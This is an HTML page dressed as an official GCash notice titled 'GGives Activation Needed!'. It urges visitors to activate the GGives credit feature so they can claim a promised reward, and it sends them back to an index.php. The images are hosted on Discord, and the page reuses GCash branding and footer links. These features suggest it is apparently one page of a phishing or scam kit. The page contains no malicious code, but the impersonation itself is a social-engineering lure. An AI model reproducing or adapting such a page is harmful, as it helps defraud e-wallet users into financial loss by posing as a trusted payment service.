<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GGives</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Karla:wght@300;400;500&display=swap" rel="stylesheet">
    <!-- Add Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * {
            font-family: 'Karla', sans-serif;
        }

        #button {
            text-align: center;
            align-items: center;
            align-content: center;
            font-family: sans-serif;
            background-color: #0057e4;
            padding: 15px 45px 10px 45px;
            font-weight: 500;
            color: #fff;
            font-size: 18px;
            border: none;
            border-radius: 50px;
        }
    </style>
</head>
<body style="position: relative;">
    <div class="container text-center">
        <div style="z-index: -1; position: fixed; bottom: 0; left: 0; width: 300px; height: 300px; background-image: url('https://cdn.discordapp.com/attachments/1099202808487616576/1120743896939495504/Group_2_2_1_2.png'); background-repeat: no-repeat; background-size: contain; background-position: bottom left; pointer-events: none;"></div>
        <div style="z-index: -1;position: fixed; top: 0; right: 0; width: 300px; height: 300px; background-image: url('https://cdn.discordapp.com/attachments/1099202808487616576/1120739422317580389/circle_1.png'); background-repeat: no-repeat; background-size: contain; background-position: top right; pointer-events: none;"></div>
        <img class="img-fluid" style="max-height: 200px;" src="https://cdn.discordapp.com/attachments/1099202808487616576/1120719578364911626/1687270751248.png" alt="">
        <h3 style="color: #2B2B35; font-weight: 600;">GGives Activation Needed!</h3>
        <p style="color: #2B2B35; max-width: 600px; margin: 0 auto 20px; text-align: center; line-height: 25px; font-weight: 300;font-size: 15px;">It seems like there's a little hurdle we need to overcome! It appears that your GCash GGives is not yet activated, which is essential to claim your reward. But don't worry, your rewards are absolutely secure and this is just a simple step to ensure you get the most out of your GCash experience.</p>
        <p style="color: #2B2B35; max-width: 600px; margin: 0 auto 20px; text-align: center; line-height: 30px; font-weight: 300;">Follow the instructions below to activate your GGives. Once done, try again and you'll be able to claim your reward with ease:</p>
        <br><br>
        <label style="font-size: 12px;" for="button">Already Activated?</label><br>
        <a href="index.php">
            <button class="btn btn-primary" id="button">TRY AGAIN</button>
        </a>
        <br><br>
        <img class="img-fluid" style="max-width: 100%; height: auto;" src="https://help.gcash.com/hc/article_attachments/18928175198617" alt="">
        <p style="color: #2B2B35; max-width: 600px; margin: 0 auto 20px; text-align: center; line-height: 30px; font-weight: 300;">Thank you for your understanding and patience, and for being a valued member of our GCash community! We are here to assist you every step of the way.</p><br><br><br><br><br>
        <p style="font-size: 12px; margin-bottom: 0;">&copy; 2019 to 2023 GCash. All Rights Reserved.</p>
        <p style="padding: 0; margin: 0; font-weight: bold;"><a href="https://www.beta.gcash.com/privacy-notice/230426" target="_blank"> Privacy Policy </a> | <a href="https://www.gcash.com/terms-and-conditions" target="_blank"> Terms and Conditions </a></p>
    </div>
    <!-- Add Bootstrap JavaScript and dependencies -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
